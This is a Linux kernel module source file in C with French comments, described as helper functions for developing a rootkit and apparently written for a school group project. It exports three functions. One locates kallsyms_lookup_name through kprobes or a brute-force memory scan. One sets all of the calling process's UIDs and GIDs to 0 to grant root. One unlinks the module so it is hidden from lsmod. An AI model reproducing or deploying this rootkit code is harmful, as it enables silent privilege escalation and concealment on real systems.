#include "rootkit_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Ecole 2600 Groupe 6");
MODULE_DESCRIPTION("Module permettant de proposer des fonctions d'aide au développement du rootkit.");
MODULE_VERSION("0.1");
                  
long unsigned int recuperer_adresse_kallsyms_lookup_name(void){
#ifdef UTILISER_KPROBE
    /* Si la version du kernel est supérieure à 5.7 alors on peut utiliser kprobe */
    
    typedef unsigned long (*ptr_fonction)(const char *_);

    register_kprobe(&kp);
    ptr_fonction kallsyms_lookup_name = (ptr_fonction) kp.addr;
    unregister_kprobe(&kp);

	return (long unsigned int)kallsyms_lookup_name;
#endif
    /* Si la version du kernel est inférieure à 5.7 alors on doit bruteforce */

    unsigned long addresse_parcourue = (unsigned long) &sprint_symbol;
    addresse_parcourue &= 0xffffffffff000000;

    char *symbole_parcouru = kzalloc(KSYM_NAME_LEN , GFP_KERNEL);

    int _;
    for (_ = 0; _ < 0x100000; _++)
    {
        sprint_symbol(symbole_parcouru, addresse_parcourue);

        if (strncmp(symbole_parcouru, "kallsyms_lookup_name", 20) == 0)
        {
            kfree(symbole_parcouru);
            return addresse_parcourue;
        }
        addresse_parcourue += 0x10;
    }
    kfree(symbole_parcouru);
    /* Adresse non trouvée donc on retourne 0, mais théoriquement impossible */
    return 0;
}

void avoir_droits_root(void)
{
    // Préparation des nouvelles credentials pour le processus
    struct cred *root = prepare_creds();

    if (root == NULL) {
        printk(KERN_ERR "[-] rootkit: Échec de la préparation des credentials\n");
        return;
    }

    // Élévation des UID et GID à 0 (root).
    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

    // Application des nouvelles credentials au processus appelant
    commit_creds(root);
}

void cacher_le_module_de_lsmod(void)
{
    list_del(&THIS_MODULE->list);
}

EXPORT_SYMBOL(recuperer_adresse_kallsyms_lookup_name);
EXPORT_SYMBOL(avoir_droits_root);
EXPORT_SYMBOL(cacher_le_module_de_lsmod);
